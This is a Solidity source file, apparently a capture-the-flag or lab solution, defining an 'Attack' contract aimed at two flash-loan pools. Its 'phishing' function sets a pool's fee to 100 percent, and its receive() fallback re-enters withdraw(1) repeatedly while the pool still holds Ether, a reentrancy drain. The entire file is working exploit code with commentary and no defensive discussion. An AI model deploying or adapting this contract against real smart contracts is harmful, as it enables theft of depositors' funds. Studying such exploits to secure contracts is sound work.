// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

// Import Hardhat console library for debugging (remove in production)
import "hardhat/console.sol";

// Define an interface for the Pool contract
interface Pool {
    // Function to set the fee percentage for the pool
    function setFeePercent(uint256 _percent) external;

    // Function to deposit funds into the pool
    function deposit() external payable;

    // Function to withdraw funds from the pool
    function withdraw(uint256 _amountOfPositions) external;

    // Function to calculate the fee for a given borrow amount
    function getFee(uint256 _borrowAmount) external pure returns (uint256);

    // Function for a flash loan from the pool
    function flashLoan(address borrowingContract, uint256 amount) external;
}

// Main Attack Contract
contract Attack {
    // Array to store instances of the Pool interface (2 pools in this example)
    Pool[2] public pools;

    // Constructor to initialize the Attack contract with pool instances
    constructor(Pool[2] memory _pools) {
        pools = _pools;
    }

    // Function to perform a phishing attack on a specified pool
    function phishing(uint256 _type) external payable {
        // Set the fee percentage of the specified pool to 100%
        pools[_type].setFeePercent(100);
    }

    // Fallback function to receive Ether
    receive() external payable {
        // Declare a local variable for the selected pool
        Pool _pool;

        // Check if the sender is the address of pool 0, then assign it to _pool
        if (msg.sender == address(pools[0])) {
            _pool = pools[0];
        } else {
            // If not, assign pool 1 to _pool
            _pool = pools[1];
        }

        // Check if the selected pool has a balance greater than zero
        if (address(_pool).balance != 0) {
            // Withdraw 1 unit of positions from the selected pool
            _pool.withdraw(1);
        }
    }
}
